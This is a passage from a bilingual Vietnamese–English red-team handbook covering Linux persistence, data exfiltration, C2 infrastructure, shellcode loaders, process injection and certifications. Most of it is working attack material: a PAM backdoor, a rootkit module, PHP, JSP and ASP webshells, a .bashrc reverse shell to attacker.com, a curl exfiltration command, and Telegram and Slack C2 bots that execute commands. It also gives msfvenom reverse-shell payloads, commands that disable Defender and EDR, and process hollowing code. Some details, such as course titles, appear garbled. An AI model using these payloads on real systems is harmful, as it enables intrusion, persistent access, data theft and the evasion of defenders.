    static ssize_t (*real_write)(int, const void*, size_t) = NULL;
    if (!real_write) real_write = dlsym(RTLD_NEXT, "write");
    return real_write(fd, buf, count);
}
```

```bash
# Compile and set LD_PRELOAD
gcc -shared -fPIC -o malicious.so malicious.c -ldl
echo /path/to/malicious.so > /etc/ld.so.preload  # Global, requires root
# Or per-user: export LD_PRELOAD=/path/to/malicious.so
```

### 6. Kernel Module Loading

```c
// rootkit.c — simple LKM
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>

MODULE_LICENSE("GPL");

static int __init rootkit_init(void) {
    printk(KERN_INFO "Rootkit loaded\n");
    // Hook syscall table
    return 0;
}

static void __exit rootkit_exit(void) {
    printk(KERN_INFO "Rootkit unloaded\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
```

```bash
# Compile and load
make -C /lib/modules/$(uname -r)/build M=$PWD modules
insmod rootkit.ko
lsmod | grep rootkit  # Check loaded
# rmmod rootkit  # Remove
```

### 7. PAM Backdoor

**Pluggable Authentication Modules (PAM):** Add backdoor password.

```c
// pam_backdoor.c
#include <security/pam_modules.h>
#include <string.h>

#define BACKDOOR_PASS "Backdoor@123"

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags,
                                    int argc, const char **argv) {
    const char *password = NULL;
    pam_get_authtok(pamh, PAM_AUTHTOK, &password, NULL);
    
    if (password && strcmp(password, BACKDOOR_PASS) == 0) {
        // Bypass with backdoor password
        return PAM_SUCCESS;
    }
    
    // Fall through to normal authentication
    return PAM_IGNORE;
}
```

```bash
# Compile and install
gcc -shared -fPIC -o pam_backdoor.so pam_backdoor.c -lpam
cp pam_backdoor.so /lib/x86_64-linux-gnu/security/

# Modify PAM config — /etc/pam.d/sshd
# auth sufficient pam_backdoor.so
# auth required pam_unix.so
```

### 8. /etc/shadow Manipulation

```bash
# Change root password (requires root)
passwd root
# Or directly edit shadow
echo 'root:$6$salt$hash:19000:0:99999:7:::' > /etc/shadow
# Generate hash: python -c "import crypt; print(crypt.crypt('password', '\$6\$salt\$'))"
```

### 9. Webshells

```php
<!-- /var/www/html/shell.php — PHP webshell -->
<?php system($_GET['cmd']); ?>
```

```jsp
<!-- /usr/local/tomcat/webapps/ROOT/shell.jsp — JSP webshell -->
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

```asp
<!-- shell.asp — Classic ASP webshell -->
<% Execute("cmd.exe /c " & Request.QueryString("cmd")) %>
```

### 10. .bashrc / .profile Backdoor

```bash
# .bashrc — execute on shell start
echo 'nc -e /bin/bash attacker.com 4444 &' >> ~/.bashrc

# .profile — same for login shells
echo '(nohup /path/to/payload &)' >> ~/.profile

# .bash_logout — execute on logout
echo 'python3 -c "..."' >> ~/.bash_logout
```

### 11. 25+ Linux Persistence Techniques Checklist

| # | Technique | Requires Root | Detection |
|---|---|---|---|
| 1 | Cron / crontab | No | /var/spool/cron, /etc/crontab |
| 2 | Systemd services | No (user) / Yes (system) | systemctl list-units |
| 3 | SSH authorized_keys | No | ~/.ssh/authorized_keys |
| 4 | LD_PRELOAD / /etc/ld.so.preload | Yes | /etc/ld.so.preload |
| 5 | Kernel module (LKM) | Yes | lsmod, /proc/modules |
| 6 | PAM backdoor | Yes | /etc/pam.d/*, ldd pam_unix.so |
| 7 | /etc/shadow modification | Yes | /etc/shadow timestamps |
| 8 | SUID binary | Yes | find / -perm -4000 |
| 9 | Capabilities | Yes | getcap -r / 2>/dev/null |
| 10 | Webshell | Varies | Web server logs |
| 11 | .bashrc / .profile | No | ~/.bashrc |
| 12 | .bash_logout | No | ~/.bash_logout |
| 13 | .ssh/rc | No | ~/.ssh/rc |
| 14 | /etc/rc.local | Yes | /etc/rc.local |
| 15 | init.d script | Yes | /etc/init.d/* |
| 16 | systemd timers | No/Yes | systemctl list-timers |
| 17 | udev rules | Yes | /etc/udev/rules.d/* |
| 18 | modprobe / modules-load.d | Yes | /etc/modules-load.d/* |
| 19 | sysctl / /etc/sysctl.d | Yes | /etc/sysctl.d/* |
| 20 | binfmt_misc | Yes | /proc/sys/fs/binfmt_misc |
| 21 | /etc/apt/apt.conf.d (hook) | Yes | /etc/apt/apt.conf.d/* |
| 22 | /etc/profile / /etc/bash.bashrc | Yes | /etc/profile, /etc/bash.bashrc |
| 23 | motd (Message of the Day) | Yes | /etc/update-motd.d/* |
| 24 | pam_env (env files) | Yes | /etc/security/pam_env.conf |
| 25 | xinit / xsession | No | ~/.xinitrc, ~/.xsession |

---

## I. EGRESS & DATA EXFILTRATION

### 1. DNS Tunneling

**DNS Tunneling** encodes dữ liệu trong DNS queries/responses.

#### dnscat2

**dnscat2** là tool chuyên cho DNS C2 và exfiltration.

```bash
# Server
sudo ruby dnscat2.rb --dns "domain=example.com,host=0.0.0.0,port=53"

# Client (Windows/Linux)
./dnscat2-v0.07-client.exe --dns domain=example.com
```

**Data Flow:**
```
Data → encode → subdomain.example.com → DNS query → DNS server → dnscat2 server → decode
```

**Detection:** DNS tunneling thường có:
- High volume of TXT queries.
- Long subdomain names (entropy cao).
- Non-standard TTLs.
- nslookup/dig từ internal hosts.

#### Cobalt Strike DNS Beacon

```
beacon> make_token DOMAIN\user password
beacon> dns_sleep 60
beacon> dns_stager true
```

**C2 DNS profile:**
- TXT records: chứa data từ server → client.
- A records: chứa tasking.
- Unique subdomain per beacon.

### 2. HTTPS/S Encrypted Exfiltration

**HTTPS exfiltration** là phổ biến nhất vì encrypted traffic khó inspect.

**Kỹ thuật:**
1. **POST to C2:** `POST /api/upload` with encrypted data.
2. **PUT to cloud storage:** PUT request to S3/Azure Blob.
3. **HTTP headers:** Hide data in headers (X-Auth-Token, Cookie).
4. **Image steganography:** Encode data in JPEG/PNG.

```bash
# Exfil via curl POST
curl -X POST https://attacker.com/upload \
  -H "Authorization: Bearer $(base64 -w0 /tmp/data.zip)" \
  --data-binary @/tmp/encrypted_data.bin
```

### 3. ICMP Tunneling

**ICMP tunneling** dùng ICMP echo request/reply để exfil:de dữ liệu.

**Tool:** `ptunnel-ng`, `icmptunnel`

```bash
# Server (attacker)
./icmptunnel -s -d 0.0.0.0

# Client (compromised host)
./icmptunnel 192.168.1.100
# Create tunnel interface
ifconfig tun0 10.0.1.1/30
```

**Detection:** ICMP packets with data payload (normal ping data = empty/less).

### 4. Cloud Storage Exfiltration

Dùng legitimate cloud services để exfil — traffic looks normal.

```python
# AWS S3 exfil
import boto3
s3 = boto3.client('s3', 
    aws_access_key_id='AKIA...',
    aws_secret_access_key='...')
s3.upload_file('secret_data.zip', 'my-exfil-bucket', 'data.zip')

# Azure Blob
from azure.storage.blob import BlobServiceClient
conn_str = "DefaultEndpointsProtocol=https;..."
client = BlobServiceClient.from_connection_string(conn_str)
container = client.get_container_client("exfil")
with open("data.zip", "rb") as f:
    container.upload_blob("data.zip", f)

# Google Drive API
from googleapiclient.discovery import build
# OAuth token → Upload file
drive_service.files().create(media_body='data.zip', body={'name': 'backup.zip'}).execute()
```

### 5. Steganography

**Steganography:** Ẩn dữ liệu trong images, audio, video.

```bash
# Image steganography with steghide
steghide embed -cf innocent.jpg -ef secret.txt -p password123
steghide extract -sf innocent.jpg -p password123

# LSB (Least Significant Bit) steganography
# Python: stegano, stepic
python -c "from stegano import lsb; lsb.hide('input.jpg', 'output.png', 'secret message')"
```

### 6. Compression & Encoding Patterns

```bash
# Standard exfil chain
tar czf - sensitive_dir/ | gpg --encrypt --recipient attacker@example.com | base64 > out.txt

# Gzip + AES + Base64
cat data | gzip | openssl enc -aes-256-cbc -pass pass:secret | base64

# Split into chunks for stealth
split -b 512K encrypted_data chunk_
base64 chunk_aa > chunk1.txt
# Upload each chunk separately
```

**Common encoding:**
- Base64 (tăng 33% size)
- Base58 (Bitcoin-style)
- URLsafe Base64
- Hex encoding
- XOR with key
- AES-256-CBC encryption

**Chunking:** Split data → exfil trong nhiều sessions → reduce per-session size → less suspicious.

---

## J. INFRASTRUCTURE OPSEC

### 1. CDN Redirectors

#### Nginx Reverse Proxy Redirector

```nginx
# nginx.conf
events {
    worker_connections 1024;
}

http {
    server {
        listen 443 ssl;
        server_name cdn.example.com;
        
        # Let's Encrypt
        ssl_certificate /etc/letsencrypt/live/cdn.example.com/fullchain.pem;
        ssl_certificate_key /etc/letsencrypt/live/cdn.example.com/privkey.pem;
        
        # Logging — minimal, không log request body
        access_log /var/log/nginx/access.log combined buffer=512k flush=1m;
        
        # C2 traffic — proxy to teamserver
        location /api/ {
            proxy_pass https://real-c2-server.com:443;
            proxy_set_header Host $proxy_host;
            proxy_set_header X-Real-IP $remote_addr;
            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
            
            # mTLS between redirector and C2
            proxy_ssl_certificate /etc/nginx/certs/client.crt;
            proxy_ssl_certificate_key /etc/nginx/certs/client.key;
        }
        
        # Benign content — để tránh scanning phát hiện
        location / {
            root /var/www/html;
            index index.html;
        }
    }
}
```

#### Cloudflare Workers Redirector

```javascript
// Cloudflare Worker — C2 proxy
addEventListener('fetch', event => {
    event.respondWith(handleRequest(event.request))
})

async function handleRequest(request) {
    const url = new URL(request.url)
    
    // Check for C2 traffic (specific path or headers)
    if (url.pathname.startsWith('/api/v1/')) {
        // Modify request
        const c2Request = new Request('https://real-c2-server.com' + url.pathname, {
            method: request.method,
            headers: request.headers,
            body: request.body
        })
        
        // Forward to C2
        const response = await fetch(c2Request)
        
        // Modify response
        const modifiedResponse = new Response(response.body, response)
        modifiedResponse.headers.set('Server', 'Cloudflare')
        modifiedResponse.headers.set('X-Forwarded-Host', url.hostname)
        
        return modifiedResponse
    }
    
    // Normal traffic — serve static
    return fetch(request)
}
```

### 2. Domain Fronting — Dead or Not?

**Domain Fronting:** Dùng CDN (Cloudflare, Akamai, Fastly) với bất đồng bộ giữa SNI header (front domain) và Host header (C2 domain).

```
[Beacon] → SNI: front.example.com (allowed)
         → Host: c2.example.com (C2 domain)
         → CDN routes based on Host: c2.example.com
         → C2 server receives request
```

**Current Status:** Phần lớn CDN providers đã block domain fronting. Cloudflare chặn từ 2018. Tuy nhiên:

- **Alternative:**
  - **Google App Engine:** Vẫn frontable (Host header khác với SNI).
  - **AWS CloudFront:** Không trực tiếp frontable nhưng dùng custom origin.
  - **Azure CDN:** Tương tự.
  - **Fastly:** Đã block.

**Modern Replacement:** CDN redirectors (trên) hoặc serverless functions.

### 3. Certificate Management

#### Let's Encrypt Auto-Renewal

```bash
# Certbot — tự động renewal
certbot certonly --nginx -d cdn.example.com --non-interactive --agree-tos -m admin@example.com

# Systemd timer renewal
systemctl enable certbot.timer

# Wildcard cert (DNS challenge)
certbot certonly --manual --preferred-challenges dns -d "*.example.com" -d example.com
```

#### Certificate Rotation

```bash
# Rotate certs — important when domain burned
certbot revoke --cert-path /etc/letsencrypt/live/burned.com/fullchain.pem
# Get new cert for fresh domain
certbot certonly --nginx -d fresh-domain.com
```

### 4. Domain Generation Algorithms (DGA)

**DGA** tạo domain names dựa trên seed (time, date, custom algorithm) — khó block.

```python
# Simple DGA
import datetime
import hashlib

def generate_domain(date=None):
    if not date:
        date = datetime.datetime.now()
    seed = f"{date.year}{date.month}{date.day:02d}"
    hash_val = hashlib.md5(seed.encode()).hexdigest()[:12]
    tlds = ['.com', '.net', '.org', '.xyz']
    return hash_val + tlds[date.day % len(tlds)]

# Usage
today_domain = generate_domain()
# Connect to today_domain
```

### 5. Fast Flux & Double Flux DNS

**Fast Flux:** Rapidly change DNS A records — C2 IP changes frequently.

**Single Flux:**
```
example.com → A 1.1.1.1 (TTL: 60s)
example.com → A 2.2.2.2 (after 60s)
example.com → A 3.3.3.3 (after 60s)
```

**Double Flux:** Change cả A record và NS record (name servers).

```
example.com → NS ns1.evildomain.com → A 1.1.1.1
           → NS ns2.evildomain.com → A 2.2.2.2
```

**Implementation:** Botnet nodes làm DNS servers + redirectors.

### 6. Bulletproof Hosting

**Bulletproof Hosting** (BPH) là hosting providers không tuân thủ takedown requests.

**Các provider nổi tiếng:**
- **NForce / Ecatel (Netherlands):** Truyền thống bulletproof.
- **Hetzner (Germany):** Không hoàn toàn bulletproof nhưng có appeal process.
- **BuyVM / FranTech (Luxembourg):** Tolerate abuse hơn US providers.
- **VPS providers in Russia/Ukraine:** Một số ignored DMCA/abuse.
- **Offshore:** Belarus, Romania, Moldova, SE Asia.

**Lưu ý:** Bulletproof hosting có thể bị compromised hoặc seized bất cứ lúc nào.

### 7. Living Off Trusted Services — C2 via Legitimate Platforms

#### Slack C2

```go
// Slack C2 — use Slack API for C2 communication
package main

import (
    "github.com/slack-go/slack"
)

func main() {
    api := slack.New("xoxb-bot-token")
    
    for {
        // Read tasks from Slack channel
        messages, _ := api.GetConversationHistory(&slack.GetConversationHistoryParameters{
            ChannelID: "C0123456789",
            Limit: 1,
        })
        
        for _, msg := range messages.Messages {
            if msg.Text == "execute" {
                // Execute command
                output := executeCommend()
                // Post result back
                api.PostMessage("C0123456789", slack.MsgOptionText(output, false))
            }
        }
    }
}
```

#### Telegram C2

```python
# Telegram Bot C2
import requests
import subprocess

BOT_TOKEN = "123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11"
CHAT_ID = "123456789"

def send_message(text):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    requests.post(url, json={"chat_id": CHAT_ID, "text": text})

def get_updates(offset=0):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates"
    r = requests.get(url, params={"offset": offset, "timeout": 60})
    return r.json()

offset = 0
while True:
    updates = get_updates(offset)
    for update in updates.get("result", []):
        cmd = update.get("message", {}).get("text", "")
        if cmd.startswith("/exec"):
            output = subprocess.check_output(cmd[6:], shell=True)
            send_message(output.decode())
        offset = update["update_id"] + 1
```

#### Discord C2

```python
# Discord webhook C2
import requests
import subprocess
import json

WEBHOOK_URL = "https://discord.com/api/webhooks/123456/ABC-DEF"

def send_message(content):
    requests.post(WEBHOOK_URL, json={"content": content})

def get_messages():
    # Discord doesn't support reading from webhooks — use bot
    pass

# Use Discord Bot API with Gateway
```

### 8. Cloud C2 — Serverless Architecture

#### AWS Lambda C2

```python
# Lambda function as C2 relay
import json
import boto3
import base64

dynamodb = boto3.resource('dynamodb')
table = dynamodb.Table('c2-tasks')

def lambda_handler(event, context):
    path = event['path']
    
    if path == '/checkin':
        # Store beacon info
        body = json.loads(event['body'])
        table.put_item(Item={
            'beacon_id': body['id'],
            'hostname': body['hostname'],
            'user': body['user'],
            'timestamp': context.aws_request_id
        })
        return {
            'statusCode': 200,
            'body': json.dumps({'status': 'ok', 'task': get_task(body['id'])})
        }
    
    elif path == '/result':
        # Store execution result
        body = json.loads(event['body'])
        table.update_item(
            Key={'beacon_id': body['id']},
            UpdateExpression='SET #r = :result',
            ExpressionAttributeNames={'#r': 'last_result'},
            ExpressionAttributeValues={':result': body['output']}
        )
        return {'statusCode': 200, 'body': 'ok'}
```

#### Serverless Redirector (Vercel/Netlify)

```javascript
// Vercel serverless function as C2 redirector
export default async (req, res) => {
    const c2Path = req.url
    
    // Forward to real C2
    const response = await fetch(`https://real-c2.com${c2Path}`, {
        method: req.method,
        headers: {
            'Content-Type': req.headers['content-type'] || 'application/octet-stream',
            'User-Agent': req.headers['user-agent']
        },
        body: req.method === 'POST' ? req.body : undefined
    })
    
    res.status(response.status)
    response.headers.forEach((value, key) => {
        res.setHeader(key, value)
    })
    res.send(await response.text())
}
```

---

## K. TOOLS MASTERY

### 1. C2 Frameworks — Comparative Analysis

| Feature | Cobalt Strike | Sliver | Havoc | Mythic | Nighthawk |
|---|---|---|---|---|---|
| **Price** | $$$ (thương mại) | Free (OSS) | Free (OSS) | Free (OSS) | $$$$ (thương mại) |
| **Implant Language** | C | Go | C++ | C#, Go, C++ | C++ |
| **Sleep Mask** | Yes (profile) | No native | Yes (Ekko) | No native | Yes (advanced) |
| **Direct Syscalls** | Via BOFs | No native | Yes | No | Yes |
| **AMSI/ETW Patch** | Via BOFs | No native | Built-in | No | Built-in |
| **BOF Support** | Native | Via extensions | No | Via Apollo | Yes |
| **Multi-Platform** | Windows | Win/Lin/Mac | Windows | All | Windows |
| **Malleable C2** | Yes (C2 profile) | Limited | No | C2 profiles | No |
| **UI** | Java GUI | CLI | Qt GUI | Web UI | CLI |
| **P2P** | SMB, TCP | Named pipes | SMB | SMB | No |
| **Staging** | Yes | Yes | Yes | Yes | No (stageless) |
| **DNS C2** | Yes | Yes | No | Yes | No |
| **Community** | Large | Medium | Growing | Medium | Small |
| **Detection Risk** | High (well-known) | Low-Medium | Low | Medium | Very Low |

### 2. Shellcode Loaders

#### Donut

**Donut** load .NET assemblies, PE files, và shellcode từ memory.

```bash
# Generate shellcode từ .NET assembly
donut -f Rubeus.exe -a 2 -b 1 -o loader.bin -p "kerberoast"

# Generate shellcode với AMSI/ETW bypass
donut -f beacon.exe -a 2 -b 2 -o staged.bin -z 2

# Parameters
-a 1|2: architecture (1=x86, 2=x64, 3=x86+x64)
-b 0|1|2: bypass technique (0=none, 1=abort, 2=patch)
-z 0|1|2: entropy (0=none, 1=random, 2=high)
```

#### sRDI (Shellcode Reflective DLL Injection)

**sRDI** convert DLL to position-independent shellcode.

```powershell
# Convert DLL to shellcode
python3 RDI.py -d payload.dll -o shellcode.bin

# Convert with export call
python3 RDI.py -d payload.dll -f ReflectiveLoader -o shellcode.bin

# PowerShell version
Import-Module .\Invoke-SRDI.ps1
Invoke-SRDI -DLLPath .\payload.dll -ExportName "ReflectiveLoader"
```

#### pe2sh / pe2shc

```bash
# PE to shellcode
python pe2sh.py payload.exe shellcode.bin
```

#### SharpBlock

**SharpBlock** load shellcode với various injection techniques:

```bash
# Generate shellcode loader with specific injection technique
SharpBlock -e shellcode.bin -m NtCreateThreadEx -o loader.exe

# Techniques: NtCreateThreadEx, CreateRemoteThread, QueueUserAPC, ThreadHijack, RtlCreateUserThread
```

### 3. Shellcode Generation Techniques

#### Cobalt Strike Artifact Kit

**Artifact Kit** customize how Cobalt Strike generates executables/DLLs.

```
/Arkit — thư mục chứa source code
├── src/
│   ├── main.c          # Template EXE
│   ├── main.dll.c      # Template DLL
│   ├── pipedecrypt.c   # Pipe decrypt stager
│   ├── transform.c     # Data transform
│   └── syscalls.c      # Syscall stubs
├── build.sh
└── output/
```

**Customizations:**
- Change injection method (VirtualAlloc + memcpy vs NtMapViewOfSection).
- Add antivirus evasion (delays, sandbox checks).
- Use direct syscalls.
- XOR/encrypt shellcode.

#### msfvenom

```bash
# Standard reverse HTTPS shellcode
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=attacker.com LPORT=443 -f raw -o shellcode.bin

# Encoded with shikata_ga_nai
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=attacker.com LPORT=443 -e x64/zutto_dekiru -i 5 -f raw -o encoded.bin

# Custom template
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=attacker.com LPORT=443 -x template.exe -f exe -o payload.exe
```

### 4. Process Injection Techniques

#### Classic Injection (CreateRemoteThread)

```c
// 1. Open target process
HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPID);

// 2. Allocate memory in target
LPVOID remoteMem = VirtualAllocEx(hProcess, NULL, shellcodeSize, 
                                   MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

// 3. Write shellcode
WriteProcessMemory(hProcess, remoteMem, shellcode, shellcodeSize, NULL);

// 4. Change to EXECUTE_READ
VirtualProtectEx(hProcess, remoteMem, shellcodeSize, PAGE_EXECUTE_READ, &old);

// 5. Create remote thread
HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, 
                                     (LPTHREAD_START_ROUTINE)remoteMem, NULL, 0, NULL);
WaitForSingleObject(hThread, INFINITE);
```

**Detection:** EDR hook CreateRemoteThread + kernel callback thread creation.

#### APC Injection (Asynchronous Procedure Call)

```c
// 1. Find thread in alertable state
HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, threadId);

// 2. Allocate + write shellcode in target (same as classic)

// 3. Queue APC
QueueUserAPC((PAPCFUNC)remoteMem, hThread, NULL);

// 4. Thread sẽ execute APC khi vào alertable state (WaitForSingleObjectEx, SleepEx, etc.)
```

**Detection:** QueueUserAPC hook + thread APC queue monitoring.

#### Thread Hijacking

```c
// 1. Open target thread
HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, threadId);

// 2. Suspend thread
SuspendThread(hThread);

// 3. Get thread context
CONTEXT ctx;
ctx.ContextFlags = CONTEXT_FULL;
GetThreadContext(hThread, &ctx);

// 4. Allocate shellcode in target
// 5. Set RIP/RIP to shellcode
ctx.Rip = (DWORD64)remoteMem;
SetThreadContext(hThread, &ctx);

// 6. Resume thread
ResumeThread(hThread);
```

**Detection:** SuspendThread + SetThreadContext hooks + thread stack analysis.

#### Threadless Injection

**Threadless injection** không tạo thread mới và không hijack thread hiện tại. Thay vào đó:
1. Set memory breakpoint (hardware or software) trong target process.
2. When target process hits breakpoint → shellcode executes.
3. Không có thread creation event.

```c
// Threadless — use vectored exception handler
// 1. Allocate shellcode in target
// 2. Set write/execute breakpoint on legitimate code
// 3. Target process hits breakpoint → exception handler → shellcode
// 4. Handler có thể modify registers, call functions
```

#### Process Hollowing

```c
// 1. Create suspended process
CreateProcess(suspectExe, NULL, NULL, NULL, TRUE, 
              CREATE_SUSPENDED, NULL, NULL, &si, &pi);

// 2. Get process context
GetThreadContext(pi.hThread, &ctx);

// 3. Read PEB to find image base
ReadProcessMemory(pi.hProcess, pebAddr, &peb, sizeof(peb), NULL);
ReadProcessMemory(pi.hProcess, peb.ImageBaseAddress, &imageBase, sizeof(imageBase), NULL);

// 4. Unmap original image
NtUnmapViewOfSection(pi.hProcess, imageBase);

// 5. Allocate memory for new image
VirtualAllocEx(pi.hProcess, imageBase, ntHeaders->OptionalHeader.SizeOfImage, 
               MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

// 6. Write PE headers and sections
WriteProcessMemory(pi.hProcess, imageBase, peData, ntHeaders->OptionalHeader.SizeOfHeaders, NULL);
// Write each section...

// 7. Set entry point
ctx.Rcx = imageBase + ntHeaders->OptionalHeader.AddressOfEntryPoint;
SetThreadContext(pi.hThread, &ctx);

// 8. Resume
ResumeThread(pi.hThread);
```

#### Transacted Hollowing

**TxF (Transactional NTFS)** hollowing: Dùng kernel transaction để thao tác file atomically.

1. Start transaction.
2. Modify legitimate EXE content (replace with payload).
3. Create process from modified EXE (suspended).
4. Rollback transaction → file restored.
5. Tránh file scanning detection vì file chỉ modified temporarily trong transaction.

### 5. CNA Scripts (Aggressor) — Mở Rộng Cobalt Strike

**CNA (Cobalt Strike Aggressor)** scripts mở rộng Cobalt Strike functionality.

**Common CNA Script Categories:**
- **Event Hooks:** `on beacon_initial`, `on beacon_checkin`, `on keylogger`, `on process_list`.
- **UI Additions:** Custom menu items, dialogs, tabs.
- **Automation:** Auto-execute command on beacon check-in.
- **Integration:** Load BOFs, PowerShell scripts, C# assemblies.
- **Reporting:** Custom log formats, data export.

**Ví dụ Auto-Privilege Escalation CNA:**
```java
# auto-privesc.cna
on beacon_initial {
    local('$bid');
    $bid = $1;
    
    # Check integrity level
    beacon_run($bid, "whoami /groups | findstr /i \"Mandatory\"");
    
    # If not SYSTEM, try elevation
    btask($bid, "Attempting privilege escalation...");
    beacon_run($bid, "run UAC-Token-Filter");
}
```

### 6. Tradecraft Scripting — Build Your Own Tooling

**Python tradecraft toolkit** structure:

```
redteam-tools/
├── psexec.py          # Custom PSExec
├── wmiexec.py         # Custom WMI exec
├── dcomexec.py        # Custom DCOM exec
├── passticket.py      # Pass-the-ticket
├── krbrelay.py        # Kerberos relay
├── dcsync.py          # DCSync implementation
├── certificate.py     # ADCS abuse
├── lsalib.py          # LSASS dumping
├── kerenum.py         # Kerberos enumeration
├── ad_enum.py         # AD enumeration
├── sccm_abuse.py      # SCCM abuse
└── utils/
    ├── crypto.py      # Encryption utilities
    ├── network.py     # Network helpers
    ├── parser.py      # Output parsers
    └── rpc.py         # RPC/DCOM utilities
```

### 7. Specialized Evasion Tools

#### EDRSandblast

**EDRSandblast** disable EDR drivers bằng cách:
1. List loaded kernel drivers.
2. Identify EDR drivers (by name, path, registry).
3. Open handle to EDR driver device.
4. Send IOCTL to disable/unload driver.

```bash
# EDRSandblast - disable EDR
EDRSandblast.exe --list
EDRSandblast.exe --kill defender
EDRSandblast.exe --kill sentinelone
EDRSandblast.exe --kill crowdstrike
```

#### DefenderStop

**DefenderStop** disable Windows Defender components:

```powershell
# DefenderStop techniques
Stop-Service WinDefend
Set-Service WinDefend -StartupType Disabled
# Registry disable
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableBehaviorMonitoring /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableOnAccessProtection /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableScanOnRealtimeEnable /t REG_DWORD /d 1 /f
```

#### Inveigh / mitm6

**Inveigh** — Windows LLMNR/NBNS/mDNS spoofer:

```powershell
# Inveigh — HTTP/HTTPS credential capture
Import-Module Inveigh.ps1
Invoke-Inveigh -ConsoleOutput Y -NBNS Y -LLMNR Y -HTTP Y -HTTPS Y
```

**mitm6** — IPv6 DNS hijacking:

```python
# mitm6 — WPAD + DNS spoofing via IPv6
mitm6 -d domain.com -i eth0 -v
```

---

## L. RED TEAM CERTIFICATIONS & TRAINING

### 1. CRTO — Certified Red Team Operator

**Provider:** Zero-Point Security (Daniel Duggan — rastamouse)

**Content:**
- Red team infrastructure setup.
- Cobalt Strike mastery (Malleable C2, BOFs, aggressor scripts).
- AD attack paths (Kerberos, delegation, ACL abuse).
- Tradecraft (evasion, OPSEC, process injection).
- C2 over SMB/DNS.
- Reporting.

**Exam:** 48-hour practical exam. Build infrastructure → compromise domain → achieve objectives → report.

**Cost:** ~$400 (course + exam).

**Prerequisite:** Strong AD knowledge, Windows internals.

### 2. OSCP / OSED / OSEP (Offensive Security)

#### OSCP — Offensive Security Certified Professional

**Focus:** Pentesting fundamentals.
- Buffer overflows.
- Web application attacks.
- Network pivoting.
- 24-hour exam.

#### OSED — Offensive Security Exploit Developer

**Focus:** Windows exploit development.
- Stack overflows.
- SEH, ROP chains.
- DEP/ASLR bypass.
- Egghunters.
- 48-hour exam.

#### OSEP — Offensive Security Experienced Penetration Tester

**Focus:** Evasion and advanced attacks.
- Process injection techniques.
- Shellcode development.
- AV/EDR evasion.
- Custom C2.
- Lateral movement with evasion.
- 48-hour exam.

### 3. CRTE — Certified Red Team Expert

**Provider:** PentesterAcademy / Altered Security

**Focus:** Advanced AD exploitation.
- Full AD attack chain.
- Cross-forest attacks.
- ADCS abuse.
- Kerberos delegation attacks.
- Azure AD connect attacks.
- 48-hour lab-based exam.

### 4. SANS Courses

#### SEC564 — Red Team Operations

**Content:** C2 infrastructure, evasion, phishing.

#### SEC660 — Advanced Penetration Testing, Exploit Writing

**Content:** Exploit development, shellcode, network attacks.

#### SEC761 — Advanced STEM and Penetration Testing

**Content:** Data exfiltration, Covert channels, evasion.

### 5. Other Notable Certifications

| Cert | Provider | Focus | Cost |
|---|---|---|---|
| CRTP | Altered Security | AD exploitation (entry) | ~$200 |
| CARTP | Altered Security | AD + Azure exploitation | ~$400 |
| PNPT | TCM Security | Full pentest methodology | ~$400 |
| CPENT | EC-Council | Enterprise pentesting | ~$850 |
| GXPN | SANS | Exploitation | ~$8000 |
| OSEP | OffSec | Evasion & process injection | ~$1500 |
| CRTO | Zero-Point | Red team & C2 | ~$400 |

---

## M. TOP RESOURCES

### 1. Blogs & Technical Sites

**C2 & Framework-specific:**
- **The C2 Matrix** (thec2matrix.com) — So sánh tất cả C2 frameworks.
- **Cobalt Strike Blog** (blog.cobaltstrike.com) — Raphael Mudge's original blog.
- **MDSec Blog** (mdsec.co.uk) — Nighthawk, C2 evasion.
- **Outflank Blog** (outflank.nl) — BOFs, sleep mask, evasion techniques.
- **Zero-Point Security Blog** (blog.z-np.com) — RTO course materials, training.

**General Red Team:**
- **SpecterOps Blog** (posts.specterops.io) — BloodHound, AD attacks, evasion.
- **xpnsec Blog** (blog.xpnsec.com) — Windows internals, process injection, evasion.
- **Aon/PrettyBlue Blog** — EDR bypass, tradecraft.
- **https://redteamer.tips/ — Aggregator của nhiều red team articles.
- **Infosec Writeups** (infosecwriteups.com) — Pentest + red team writeups.

**Research Papers:**
- **VX Underground** (vx-underground.org) — Malware source code, analysis.
- **Exploit Database** (exploit-db.com) — Exploit code.
- **Pentest Important Papers** — Collection of seminal pentest papers.

### 2. GitHub Repositories

| Repo | Description |
|---|---|
| **Cobalt Strike** | [Official](https://github.com/Cobalt-Strike) (private, but community repos exist) |
| **BC-SECURITY/Empire** | PowerShell Empire fork |
| **Sliver** | BishopFox/sliver — Open source C2 |
| **Havoc** | HavocFramework/Havoc |
| **Mythic** | MythicC2Profiles/Mythic |
| **Covenant** | cobbr/Covenant |
| **SysWhispers2/3** | jthuraisamy/SysWhispers2 — Direct syscall generation |
| **Donut** | TheWover/donut — Shellcode generation |
| **EDRSandblast** | wavestone-cdt/EDRSandblast |
| **SharpCollection** | Flangvik/SharpCollection — .NET tool collection |
| **mimikatz** | gentilkiwi/mimikatz |
| **Impacket** | SecureAuthCorp/impacket |
| **BloodHound** | BloodHoundAD/BloodHound |
| **EvilGinx2** | kgretzky/evilginx2 |
| **GoPhish** | gophish/gophish |
| **Rubeus** | GhostPack/Rubeus |
| **Seatbelt** | GhostPack/Seatbelt |
